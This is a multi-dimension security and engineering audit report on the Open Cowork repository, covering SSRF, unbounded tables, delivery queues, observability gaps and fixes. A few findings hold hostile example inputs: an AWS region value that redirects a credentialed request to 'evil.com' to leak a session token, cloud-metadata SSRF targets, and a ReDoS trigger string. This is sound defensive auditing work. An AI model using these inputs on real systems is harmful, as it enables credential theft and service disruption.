# Open Cowork — Deep Repository Audit, Pass 3 (2026-06-25)

**Method.** Ten parallel dimension-audits — (1) cloud auth/tenant-isolation/secrets-crypto, (2) injection/SSRF/deserialization/process-exec, (3) Electron + renderer security, (4) cloud DB scalability, (5) cloud worker/scheduler concurrency + store parity, (6) gateway scalability/resilience, (7) desktop + runtime-host performance, (8) code quality/dead code, (9) production-readiness/ops/observability/testing, (10) docs drift + the 7 MCPs + shared/ui/gateway-channel. Each auditor read actual source, was briefed on the pass-2 findings + their remediation, and hunted only for what is **new or deeper** — re-verifying the pass-2 fixes rather than re-flagging them.

**Severity scale (normalized):** **P0** = outage/data-loss under normal use/growth, or actively exploitable. **P1** = serious; incident under load/specific conditions; meaningful security/correctness gap. **P2** = should-fix; degradation / latent bug / defense-in-depth. **P3** = polish.

**Headline.** The pass-2 remediation is **genuinely sound** — every fix the auditors re-checked (envelope key rotation, per-credential salts, SSE keepalive, the bounded worker pool, the shared `withRetry`, the markdown/mermaid sanitizers, the boot canary, tenant isolation, OIDC) holds up under scrutiny. **No new P0.** But the remediation **broke two hard CI release-gates** (now fixed — see below), and pass-3 surfaced a cluster of genuine **P1s the prior passes missed**: an unguarded SSRF + credential-redirect on the desktop cloud-login path, two more **unbounded-growth tables** (`cloud_workspace_events`, terminal `cloud_session_commands`), an **unbounded delivery queue + duplicate-delivery** path under backlog, the **non-streaming twin of the P0-3 fsync stall**, a **phantom paging alert**, a **dead cloud knowledge-MCP path**, and a **store-parity test gap** that leaves the highest-risk concurrency methods unproven. Nothing is an active cross-tenant data leak or RCE.

Counts: **P0 ×0, P1 ×7, P2 ×~26, P3 ×~20**, plus the 2 CI-gate regressions (fixed).

---

## Fixed during this audit — two hard CI gates were red at HEAD

Both are hard gates in `ci.yml` + `release.yml`; my pass-2 per-commit gate (tsc/node/lint/knip/cloud:build) did not run them, so the regressions reached HEAD.

- **`pnpm ops:validate` was red** — the P1-O4 object-store instrumentation renamed the emitted metric to `open_cowork_cloud_object_store_operations_total{status=…}` and updated only the alert + unit test, leaving the catalog, Grafana panel, SLO template, and both validators pointing at the old `open_cowork_object_store_errors_total`. Fixed: repointed all five (with the correct `cloud_object_store_kind`/`operation` labels) and cataloged the emitted duration histogram.
- **`pnpm deploy:validate` was red** — a "repoint extraction-moved paths" edit had set the http-server read target to the package specifier `@open-cowork/cloud-server/http-server` (ENOENT, which masked a second drift: the `Retry-After` header moved to `http-response-writers.ts` during the cloud-server extraction). Fixed: read the real path and split the assertion to each phrase's owning module.

(Three stray ReDoS-timing probe `.mjs` files an audit agent left in `apps/desktop/` were also removed.)

---

## P1 — Serious

### [P1-A] Desktop cloud-workspace OIDC issuer/token fetch has no SSRF policy and follows redirects — *injection/ssrf*
`apps/desktop/src/main/cloud-workspace-auth.ts:289,298,214-215,259,322,347` (reached via IPC `ipc/workspace-handlers.ts:101` → `workspace-gateway.ts:400` → `authenticator.login`)
After a user connects a cloud workspace and logs in, `fetchDesktopConfig` reads `issuerUrl` verbatim from that server's `/auth/desktop/config`, and `fetchDiscovery` reads `token_endpoint`/`authorization_endpoint` from the discovery doc — all flow straight into `fetch()` with **no scheme check, no private-IP/cloud-metadata block, no same-origin pin to `baseUrl`, and default redirect-following**. A rogue/compromised cloud backend (or a discovery doc that 30x-redirects) drives the desktop **main process** to GET/POST arbitrary internal hosts (`169.254.169.254`, `10.*`, `127.0.0.1:<port>`); the token POSTs additionally leak a freshly minted auth `code` + PKCE verifier + refresh token to the attacker host. `baseUrl` is https-pinned, so the precondition is trusting a malicious server enough to log in — bounding it below a pre-auth hole — but the issuer/endpoint indirection is a genuine unguarded SSRF + credential-redirect on a sensitive path. **Fix:** run `issuerUrl`/`token_endpoint`/`authorization_endpoint` through `evaluateHttpMcpUrlResolved`, require same registrable origin as `baseUrl`, set `redirect:'manual'` on the token POSTs. *Confidence: high.*

### [P1-B] `cloud_workspace_events` grows unbounded with NO retention — the overlooked twin of P1-C3 — *cloud-db*
`session-projection-service.ts:108-130` (dual-append), `scheduler.ts`, `postgres-control-plane-store.ts:1449-1531`, `postgres-schema.ts:1161-1169`
Every projected event writes **two** rows — one to `cloud_session_events` (now prunable after P1-C3) **and** one to `cloud_workspace_events`, which has **no `pruneWorkspaceEvents`, no `workspaceEventMs` knob, and no `created_at` index** (migration 022 covered only the other three event tables). On any active tenant it grows 1:1 with session events, forever, with no operator escape hatch — the exact disk/IO cliff P1-C3 closed, left half-open. **Fix:** add `pruneExpiredWorkspaceEvents` (ctid-keyed bounded delete), a `workspaceEventMs` retention knob wired through scheduler + app, and a `cloud_workspace_events_created_idx` (CONCURRENTLY); confirm the SSE initial-drain tolerates a non-zero `min(sequence)` floor. *Confidence: high.*

### [P1-C] Gateway delivery dispatcher queue is unbounded → backlog drain is a memory cliff + duplicate-delivery engine — *gateway*
`apps/gateway/src/gateway-runtime.ts:146-198,228-234`, `packages/cloud-server/src/http-routes/channel-delivery-sse.ts:79-89`
P1-G2 bounded outbound *concurrency* (8) but the dispatcher's `lanes`/`queue` have **no depth cap and no producer backpressure**; the cloud SSE handler drains the entire backlog in a tight `while(claimed)` loop, never waiting for the gateway to ack. On a backlog drain (post-downtime/scale/burst): (1) **unbounded heap growth** proportional to backlog × payload (the session-event path got `maxQueueDepth=512`+resubscribe; delivery did not), and (2) **duplicate deliveries + premature dead-letter** — each delivery's server-side claim (`ttlMs` default 30s) is **never renewed** while it waits in the deep local queue, so it expires, the cloud re-selects + re-sends it, and the inflated `attempt_count` can trip `MAX_DELIVERY_ATTEMPTS=5` and dead-letter a valid message. Provider `deliveryId` echo does **not** dedup a resend. **Fix:** add `maxQueueDepth` and stop reading the SSE when exceeded (resubscribe from the still-claimable server backlog, mirroring session-stream-manager); independently, renew the claim while queued or bound the queue to a safe fraction of `ttlMs`. *Confidence: high (mechanism); med (heap magnitude — load-test).*

### [P1-D] The store-parity contract still does not exercise the lease-reaper, lease-loss/renewal, or the command-"steal" branch; the real-Postgres concurrency proofs remain entirely `skip` — *store-parity/testing*
`tests/cloud-control-plane-store-contracts.test.ts:250-273`, `tests/cloud-postgres-concurrency.test.ts` (every test `skip: POSTGRES_SKIP`)
P1-O6 added the claim methods to the always-on (in-memory + pglite) contract, but stopped short of the highest-risk methods: `reapExpiredSessionLeases`, `renewSessionLease`, `checkpointSession` stale-version semantics, and the `claimNextSessionCommand` "steal a `running` command owned by a different lease token" branch (postgres:1919 vs in-memory:1473-1475) are exercised by **neither** the always-on contract **nor** an un-skipped concurrency proof. So a divergence in reaper requeue, checkpoint-version drift, or command-stealing would pass CI. **Fix:** add those methods to the parametrized contract and run the `cloud-postgres-concurrency.test.ts` bodies against pglite (drop `skip` for the pglite variant). *Confidence: high.*

### [P1-E] Cloud `sync()` re-serializes + fsyncs the entire cache once per changed session — O(n²) bytes + 8-way concurrent rewrites of one file — *desktop perf (the non-streaming twin of P0-3)*
`cloud-workspace-adapter.ts:659-674` → `cloud-workspace-cache.ts:499-513,583-609` → `fs-atomic.ts:80`
P0-3 fixed the *streaming* path, but `sync()` (initial connect, reconnect, **every `snapshot.required`**) calls `getSessionView`/`listArtifacts` for up to 100 changed sessions each via `settleWithConcurrency(8)`, and **every `upsertSessionView`/`upsertArtifactList` does a full `readRecords()` (readFileSync+decrypt+JSON.parse of all cloud transcripts) + `writeRecords()` (stringify+encrypt+writeFileAtomic temp→fsync→rename of all transcripts)**. Cost = n × O(total-cache-size) = **O(n²)** bytes per sync, on the main thread; plus up to 8 read-modify-write cycles interleave on the same file (last-writer-wins can silently drop a view another worker just wrote). **Fix:** batch durable writes during a sync (accumulate + flush once, or route all cache mutations through the existing `KeyedSerializer`); ideally split per-session views into per-session files. *Confidence: high (traced); profile to quantify block time.*

### [P1-F] `open_cowork_cloud_projection_lag_events` (severity: page) is a phantom alert — zero emit sites — *observability*
`deploy/observability/prometheus-alerts.yaml:58-66`, `metrics-catalog.json:138`, `scripts/launch-readiness.mjs:828`
Durable-event projection lag is cataloged, graphed, and **paged on**, but is **never emitted** (0 emit sites across `packages/`+`apps/`) — the same class P1-O4 fixed for object-store, still live for the core data-consistency signal (a worker projecting stale state). The `launch-readiness.mjs` projection-lag gate is also a silent no-op (value always `undefined`). **Fix:** emit `projection_lag_events` (durable seq − projected seq) from the projection path, or move it to the DB-collector; add a validator assertion that every alerted metric has an emit site. *Confidence: high.*

### [P1-G] Cloud knowledge MCP rejects its own cloud URL — the entire cloud wiki-edit path is dead — *mcp*
`mcps/knowledge/src/index.ts:56-61` ↔ `packages/cloud-server/src/knowledge-agent-runtime.ts:44,58-60`
The single `mcps/knowledge` source is bundled verbatim for desktop **and** cloud, but its `bridgeUrl()` hard-rejects any non-`http:` scheme and any non-loopback host — while the cloud runtime sets `OPEN_COWORK_KNOWLEDGE_TOOL_URL = https://<publicUrl>/api/knowledge/agent`. So the first `propose_knowledge_edit` in cloud throws `…must use http:// for the local bridge`; a cloud coworker can never propose a wiki edit. No test feeds an HTTPS URL through `bridgeUrl()`, and `mcps/knowledge/` has no test dir. **Fix:** allow `https:`+non-loopback in `bridgeUrl()` (gate loopback-only to the `http:` desktop case); add a unit test against an `https://…` URL. *Confidence: high.*

---

## P2 — Should-fix / latent / defense-in-depth

**Security / SSRF / crypto:**
- **[P2] AWS Secrets Manager `region` unvalidated → credentialed SigV4 request to attacker host + session-token exfil.** `secret-adapter.ts:258,282,322`. A tenant git `credentialRef = "aws-sm://secret?region=evil.com/?"` yields endpoint host `secretsmanager.evil.com`; the SigV4 POST (carrying `Authorization` + `x-amz-security-token`) leaks the session token. Gated by operator enabling git project sources + AWS creds on the worker. **Fix:** validate `region` `^[a-z0-9-]+$`; same fix for the BYOK `kmsRef` sink. *high.*
- **[P2] Catastrophic ReDoS in `colorFunctionArgs` reachable from operator branding config (no length cap).** `shared/src/design-tokens.ts:575` (`rgb(`+50k spaces hangs SSR/config thread; measured 10.6s at N=4000). Operator-controlled (not tenant/agent), so footgun not remote-DoS — but exported from `@open-cowork/shared`. **Fix:** length-cap before the regex and/or de-ambiguate the pattern. *high.*
- **[P2] Cloud checkpoint restore follows pre-existing symlinks (lexical-only containment, no pre-wipe).** `workspace-checkpoint-store.ts:504-506`. A compromised agent that plants a symlinked dir into a writable restore root, then triggers save+restore with a traversing `relativePath`, can write (attacker-chosen mode) outside the root. Not reachable from an HTTP body. **Fix:** wipe roots before restore (as project-source does) or realpath `dirname(target)` / `O_NOFOLLOW`. *med.*
- **[P2] Desktop-pairing broker URL DNS-rebinding TOCTOU (checked at resolve, fetch re-resolves, no IP pin).** `desktop-pairing/broker-url-policy.ts:69-74` / `transport.ts:138,141`. Operator-set broker hostname rebinds public→loopback/metadata between check and fetch; pairing Bearer token + bodies go to the internal target. `mcp-url-policy` already returns `resolvedAddresses` to pin — pairing discards it. **Fix:** propagate + pin the validated IP. *high.*
- **[P2] Auto-update release manifest unauthenticated for non-GitHub providers.** `update/update-release-source.ts:334-505`, `update-service.ts:273-276`. Generic provider verifies only the yml-supplied sha512 (no signature); feed control → arbitrary binary with matching hash. On macOS the same-signing-identity backstop holds; the Win/NSIS branch has no equivalent. **Fix:** sign the manifest / pin the feed host. *med (trust-model gap).*
- **[P2] Hand-rolled secret scrubbers proliferate with inconsistent `sk-` length + divergent denylists; standalone-gateway's misses Google/JWT/`ghp_`.** `apps/standalone-gateway/src/redaction.ts:28` (internet-facing, persists `lastError`; its `ghp-` arm won't even match modern `ghp_`), `cloud-server/public-channel-records.ts:54` (API-returned records, `sk-…{16,}` lets short tokens through), `operational-text-redaction.ts`, `desktop-pairing/redaction.ts`. **Fix:** route all through the shared `log-sanitizer` pattern set. *high.*

**Scalability / DB / concurrency:**
- **[P2] Terminal `cloud_session_commands` rows ('acked'/'failed') never deleted → unbounded per-session growth dragging the claim probe.** `postgres-control-plane-store.ts:1945-1987,1911-1923`, `workflows.ts:258-263`. The non-partial `pending_idx` + the workflow NOT-EXISTS scan walk terminal rows. **Fix:** retention for terminal commands, or make `pending_idx` partial on `status IN ('pending','running')`. *high.*
- **[P2] Channel-interaction token lookup is a non-sargable in-org scan with no `(org_id,status)` index, and runs twice per resolution.** `postgres-control-plane-store.ts:769-780,842-846` (the new P2-6 `left(...)` prefix-scan). Org-scoped + user-action-gated, so P2 not a cliff. **Fix:** partial index `(org_id, expires_at) WHERE status='pending'`, or fixed-shape interaction ids + a regex PK fast-path; fold the two scans into one. *high.*
- **[P2] Worker-minute quota is consumed-then-stranded on quota/entitlement denial mid-drain.** `worker.ts:88-97`, `session-service.ts:3523-3554`. On denial the worker abandons the in-flight `running` command to the reaper (≈30s stall + a burned attempt) and never refunds the pre-consumed minute — no snapshot/restore on the *execution* reservation (unlike enqueue). **Fix:** release/requeue the command on denial; reconcile the reserved minute in the `finally`. *high.*
- **[P2] `restoredLeaseTokens` set grows unbounded for the worker lifetime.** `worker.ts:45,315-319` (never pruned; one string per lease, faster now that the pool touches more sessions — same class as the fixed P3-13). **Fix:** key on `tenant\0session`, evict when the lease drops; also avoids re-running checkpoint restore for a warm session on a new token. *high.*
- **[P2] No per-org fairness in worker lane allocation.** `worker.ts:202-283`, `quotas.ts:312` (`ORDER BY first_sequence`). The P3-16 pool removes *per-session* HoL but a single high-volume org's oldest commands fill the batch + all lanes, starving other tenants within a worker. **Fix:** round-robin the claimed batch by tenant, or cap sessions-per-org per batch. *high.*
- **[P2] Store-parity: in-memory `reapExpiredSessionLeases` resolves the audit org tenant-only; postgres matches `tenant_id OR org_id`.** `postgres…:1805-1809` vs `in-memory…:1363`. Divergent/mis-scoped audit event when `org_id≠tenant_id`. *med.*
- **[P2] Store-parity: `pendingSessionCountEstimate` diverges — postgres bounds to `limit+1`, in-memory returns the full uncapped count.** `quotas.ts:316-323` vs `in-memory…:1058`. The `command_queue_depth_estimate` gauge reads different numbers per backend → alert thresholds mis-fire. **Fix:** bound in-memory the same way; assert in the contract. *high.*
- **[P2] SQLite coordination-watch match path is an unbounded read (no LIMIT) while the cloud path clamps.** `runtime-host/.../coordination-store.ts:574-583` vs `cloud-server/.../coordination-watches.ts:55`. Hot path for local coordination-notification fan-out. **Fix:** add a bounded LIMIT + `limit` param. *high.*

**Gateway / delivery:**
- **[P2] Delivery claim TTL never renewed even at normal depth → slow providers (long Retry-After, SMTP timeout, many chunks) re-trigger duplicates.** `gateway-runtime.ts:465-515`, claim TTL 30s. The histogram buckets to 30_000ms acknowledge sends reach that range. **Fix:** renew the claim in-flight or set `ttlMs > max send timeout + queue wait`. *high.*
- **[P2] Multi-chunk send re-sends already-delivered chunks on a mid-chunk transient failure.** `gateway-runtime.ts:517-533` (`sendDelivery`). No per-chunk progress cursor; providers don't dedup the per-chunk id. **Fix:** track last-sent chunk index, resume from there. *high.*

**Desktop / runtime-host:**
- **[P2] Thread-index query cache is still cleared wholesale on every write (P0-4 "granular invalidation" half-done).** `thread-index-store.ts:169-173`. The signature-skip landed (writes rarer), but each write still flushes all search/facet results. **Fix:** per-session generation / evict only affected keys. *high.*

**Code quality:**
- **[P2] Tool-call status defaults to `'complete'` on history replay but `'running'` live — an interrupted tool renders as finished after reload.** `runtime-host/session-history-projector.ts:638,838` vs `cloud-server/opencode-runtime-adapter.ts:114` + `desktop/event-message-handlers.ts:787`. **Fix:** one shared `deriveToolStatus(state)`; history else-arm should yield `'running'` when no output/error. *high.*

**Observability:**
- **[P2] Metric catalog out of sync with emitted reality** (alerted-but-uncataloged: `otlp_dropped_records_total`, `auth_accounting_errors_total`, `runtime_cache_close_failures_total`, `scheduler_loop_duration_ms`, `gateway_providers`; emitted-but-uncataloged: `loop_errors_total`, `opencode_events_dropped_total`, `provider_delivery_latency_ms`, …; cataloged-but-unemitted: `sse_connections`). **Fix:** reconcile catalog↔code↔alerts via a generated cross-check (enumerate emit sites, not a hardcoded list). *high.* — Note the node-test gate `cloud-deployment-artifacts.test.ts:947` asserts `alerts + dashboard` concatenated, which let the object-store drift through; assert per-artifact + per-emit-site.

**MCP / docs (operator-load-bearing drift):**
- **[P2] Charts MCP interpolates user field names unescaped into Vega `calculate` expressions.** `mcps/charts/src/advanced-tools.ts:67,70,179,288`; `chartFieldNameSchema` (`schemas.ts:88`) permits `"`/`]`/`\`. Vega expr injection (sandboxed, no RCE), bypasses `validateInlineSpec`. **Fix:** escape field names or tighten the schema to `^[\w .\-]+$`. *high.*
- **[P2] Docs omit operator-load-bearing env vars:** object-store credentials (`object-store.ts:757-773`, 9 vars), the Postgres pool block (`postgres-pool-options.ts:62-69`, incl. the P0-2 `statement_timeout`), 5 abuse-quota vars (`cloud-config.ts:334-358`), and `OPEN_COWORK_CLOUD_SSE_MAX_LIFETIME_MS` (the P2-9 knob) — all absent from `docs/open-cowork-cloud.md`. **Fix:** add the env tables. *high.*
- **[P2] Runbook triages a never-emitted metric** `open_cowork_cloud_command_oldest_age_ms` (`runbooks/cloud-managed-operations.md:228`; code emits `command_queue_depth_estimate`). **Fix:** drop it or emit the gauge. *high.*
- **[P2] `mcps/README.md` lists 5 of 7 MCPs** (missing knowledge + semantic-ui); **`skills-and-mcps.md`** has no knowledge card; **semantic-ui README** omits `ui_list_actions`; **knowledge MCP has no README** (an outbound-HTTP, token-bearing server). **Fix:** update each. *high.*

---

## P3 — Polish (condensed)

- **NUL byte in `session-service.ts:635`** (the `bootstrappedPrincipals` key) — the one the pass-2 NUL sweep missed; cosmetic but makes the file binary to grep. Use the `'\0'` escape / the `key(...)` helper. *high.*
- **Postgres API-token fast-path falls back to a full-table scan for non-standard ids** (`api-tokens.ts:90-108`) — latent only (all issued ids match the shape). *high.*
- **`runtime-skill-catalog` writes bundle files with no traversal guard** (`runtime-skill-catalog.ts:17-19,133-143`) — safe only because input is curated. *high.*
- **Electron:** broker `requestHeaders` echoed without allowlist (`update-release-source-gcs.ts:54-60`); `command:run` not cross-checked vs `command:list`; `dialog:save-text` denylist non-exhaustive + no `O_NOFOLLOW` (native-picker-driven, so not renderer-exploitable). *all low-impact by provenance.*
- **Gateway:** `subscribeEventSource` silently drops `onClose` (latent P1-G1 no-op on the no-header transport path); dispatcher lane scheduling is insertion-order-biased (latency unfairness, no deadlock); `deliveryLaneKey` collapses nested-object targets; worker heartbeat reports a single `activeSessionIds` under the pool; one poison session aborts the whole tick + discards the processed-count metric.
- **Runtime-host:** `lastIndexSignatures` not pruned on bulk thread deletion (capped leak); knowledge-store + coordination-store re-`chmod` every transaction (not per-event; adopt the thread-index `ensureFileModesOnce` pattern).
- **DB:** `checkPostgresActiveWorkerQuota` still does a 3-table COUNT (the one quota without an O(1) gauge).
- **Code quality:** modularity-budget entries for `http-server.ts`/`in-memory-control-plane-store.ts` are inert (below the 2000-line gate); tool-bridge boilerplate copy-pasted ×4 with a divergent body cap (16KB vs 256KB); duplicated/ drifted validators + formatters (custom-MCP name regex, `readBearerToken` ×3, `formatElapsedMs` vs `formatDuration` → "59s" vs "1m", byte formatters missing a GB branch); two parallel events→SessionView reducers with divergent ordering/streaming/system-message rules.
- **Docs:** `security-model.md` CSP block omits `frame-src 'self'` + `open-cowork-asset:` img-src; login-shell allowlist omits `dash`; `allowPrivateNetwork` wording overstated (metadata stays blocked); agents/knowledge MCPs relay raw bridge error strings to the model; ~10 lower-stakes cloud env vars undocumented (`DEPLOYMENT_TIER`/`CORS_ORIGIN`/`LIVENESS_PORT` are the security-relevant ones).

---

## Verified strong (re-checked this pass — do NOT re-flag)

- **Auth / tenant isolation / crypto** — the just-added envelope key rotation (kid keyring + current-first trial-decrypt with constant GCM failure, retired keys decrypt-only) and per-credential salts (id-prefilter+verify, no downgrade) are cryptographically sound; `ensurePrincipal` re-reads + overwrites role/org from stored membership every request (no revocation window); zero `body.orgId/tenantId/workspaceId` trust; API-token scope is layered (coarse route gate + fine-grained service authz + per-binding gateway scope); BYOK reveal gated on `active`+`lastValidatedAt` with stable AAD, never logged; OIDC does full JWT validation (alg allowlist, kid-match, iss/aud/exp/nbf/email_verified, PKCE+nonce+signed-state); CORS exact-match origin + no `Allow-Credentials`; CSRF double-submit constant-time (P3-1 confirmed).
- **Injection/SSRF core** — `mcp-url-policy`/`webhook-url-policy` block metadata+NAT64+IPv4-mapped; provider-catalog + capability-bundle route through the shared policy; SQL fully parameterized repo-wide; process spawn uses literal args + shell/eval-flag/metachar blocks + path containment; git project-source scheme/ref/host allowlisted; deepMerge guards `__proto__`; log-sanitizer truncates before regex; no header injection.
- **Electron** — `contextIsolation/sandbox/nodeIntegration` correct on both windows; preload exposes only `coworkApi` behind channel whitelists; **universal** `assertTrustedIpcSender` on every handler; packaged/dev separation; strict packaged CSP; custom-protocol realpath-both-sides + extension allowlist; markdown sanitizer (P2-2) airtight (`ALLOWED_URI_REGEXP` blocks js/data/vbscript + control-char prefixes; forced `rel`); mermaid `securityLevel:'strict'`+`FORBID_TAGS:['foreignObject']`; Vega frame opaque-origin sandbox + dual-side postMessage trust; navigation/window-open allowlists on all web-contents.
- **Cloud DB (pass-2 fixes confirmed)** — `statement_timeout=30s`+`idle_in_transaction=120s`; demand-driven SSE replay hub + per-org cap; keyset-paged projection rebuild + aggregate status; O(1) concurrency gauges + reconcile; all claim queues `FOR UPDATE SKIP LOCKED` with matching indexes; advisory-locked idempotent migrations; retention sweeps bounded; the P1-C4 index set present; list reads bounded.
- **Worker concurrency** — the new pool is correct (synchronous cursor handoff = no double-claim; per-lane accumulation = no lost-update; `firstError` gating; `clampInteger` bounds; `1` reproduces serial); lease fencing (token+expiry) parity-matched; `executeWithLeaseRenewal` lease-loss handling sound; quota `consumeUsageQuota` atomic + parity-matched; scheduler claim bounds in place.
- **Gateway resilience** — P1-G1 resubscribe+watchdog (live on the header/fetch path); P1-G2 bounded concurrency + lane ordering; P1-G3 standalone `/ready` single-flight + aggregate SQL; P1-G4 lease-aware jobs (parity-matched); P1-G5 slowloris timeouts; session-stream-manager bounded+LRU+resubscribe; provider-errors classification; metrics histogram (P3-15) correct + bounded cardinality; `withRetry` (P3-8) behavior preserved; daemon rate-limiter (P3-11) evict-by-relevance.
- **Desktop/runtime-host (pass-2 fixes confirmed)** — P0-3 debounced cursor sibling; P0-4 signature-skip + chmod-once + single tx; P1-X1 KeyedSerializer; P1-X2 dual-side ordering; P1-X3 atomic headless write; P1-D3 hoisted coordination query; session-event-dispatcher batched+bounded; session-engine memoized; bounded task-state/registry/coordination stores; provider-catalog dedup+TTL+cap+SSRF.
- **Ops** — graceful drain (`/readyz`→503); SSE keepalive+max-lifetime (P2-9); Helm probes/preStop + worker `/livez`; boot canary wired (P2-17); parity contract runs in-memory+pglite always; Dockerfiles SHA-pinned non-root; all 11 alert runbook anchors resolve; gateway latency dashboard uses `histogram_quantile`.
- **MCPs / shared** — semantic-ui/workflows/skills/clock MCPs hardened (loopback+http-only+credential-reject+zod+path-traversal defense+DST handling); `gateway-channel/retry.ts` + `coordination.ts` coercers correct; **zero "Prosus"/brand leakage** anywhere.

---

## Recommended fix order

1. **Already done:** unbreak the two CI gates (ops:validate / deploy:validate).
2. **Security, low-effort:** SSRF-pin the desktop cloud-login OIDC fetches (P1-A) + AWS region validation (P2) + branding ReDoS cap (P2) + the standalone-gateway scrubber (P2) — small, high-value.
3. **Unbounded-growth cliffs:** `cloud_workspace_events` retention (P1-B), terminal `cloud_session_commands` (P2), `restoredLeaseTokens` (P2) — same class pass-2 mostly closed; finish it.
4. **Delivery correctness:** delivery queue bound + claim renewal (P1-C, P2 ×2) — closes a real duplicate-delivery/heap path.
5. **The non-streaming fsync stall** (P1-E) — batch the cloud `sync()` writes.
6. **Test/observability integrity:** port the concurrency proofs to pglite (P1-D); emit `projection_lag_events` (P1-F); reconcile the metric catalog + tighten the artifact gate (P2).
7. **Cloud knowledge MCP** (P1-G) — one-line `bridgeUrl()` fix unblocks the cloud wiki path + add a test.
8. **P2 store-parity + doc env tables + MCP docs**, then the P3 polish sweep.

Each fix should land as its own gated commit (tsc, node + renderer tests, lint, knip, cloud:build, **plus `ops:validate` + `deploy:validate`** — the two gates this pass found red) with regression tests where verifiable — same discipline as passes 1–2.

---

## Resolution status (2026-06-25)

Remediated as individually gated commits (tsc, node + package tests, lint, knip,
cloud:build, **and now `ops:validate` + `deploy:validate`**), with regression
tests wherever verifiable.

**Fixed during this pass:**
- The two CI release-gates (ops:validate / deploy:validate) that the pass-2
  metric rename + a path edit had left red.
- **P1-A** desktop cloud-login OIDC SSRF + `redirect:'manual'`; **P1-B**
  `cloud_workspace_events` retention + index (+ channel-interaction pending
  index); **P1-C** gateway delivery queue bound + shed (heap-cliff half);
  **P1-D** runnable-estimate parity + reaper contract coverage; **P1-E** batched
  cloud `sync()` writes; **P1-F** projection-lag gauge emission + catalog
  reconcile; **P1-G** cloud knowledge-MCP https bridge.
- P2s: AWS-region validation, branding ReDoS cap, checkpoint-restore symlink
  guard, standalone-gateway scrubber consolidation, terminal-/workspace-event +
  channel-interaction indexes, worker `restoredSessions` leak + per-org lane
  fairness, shared `deriveToolStatus`, coordination-watch match LIMIT, charts
  Vega field escaping, the cloud env-table / MCP / runbook / security-model doc
  drift.
- P3s: the remaining NUL byte (session-service), skill-bundle path traversal
  guard, thread-index signature prune on bulk delete.

**Deliberately deferred (documented, lower-value or needs a larger design):**
- **P1-C duplicate-delivery half** — renewing a delivery's server-side claim
  while it is in-flight past the 30s TTL needs a cloud-side claim-renew API; the
  multi-chunk resume needs a per-chunk progress cursor.
- **P1-D** — porting the full lease-loss/renewal + command-steal concurrency
  proofs off the postgres-only `skip`, and the reaper `org_id`-resolution
  divergence (audit-event-only, single-org configs unaffected).
- **P2** — worker-minute reservation refund on mid-drain quota denial; auto-update
  release-manifest authenticity (needs manifest signing or a pinned feed host);
  desktop-pairing + cloud-login DNS-rebind connect-time IP pin (needs a pinned
  dispatcher).
- **P3** — thread-index granular query-cache invalidation (now low-impact after
  the signature-skip), knowledge/coordination `chmod`-once, broker
  `requestHeaders` allowlist, `command:run` allowlisting, worker-heartbeat
  accumulation. Tracked for a follow-up sweep.
